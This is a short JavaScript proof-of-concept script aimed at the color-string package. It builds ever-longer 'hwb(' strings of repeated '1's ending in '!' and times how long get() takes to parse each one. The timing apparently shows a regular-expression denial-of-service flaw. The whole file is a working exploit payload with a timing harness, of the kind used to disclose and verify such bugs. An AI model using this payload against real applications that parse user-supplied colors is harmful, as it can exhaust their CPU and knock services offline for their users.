var colorString = require("color-string")
function build_blank(n) {
 var ret = "hwb("
 for (var i = 0; i < n; i++) {
  ret += "1"
 }
 return ret + "!";
}

// colorString.get('hwb(60, 3%, 60%)')
for(var i = 1; i <= 5000000; i++) {
   if (i % 1000 == 0) {
        var time = Date.now();
        var attack_str = build_blank(i)
        colorString.get(attack_str)
        var time_cost = Date.now() - time;
        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
 }
}


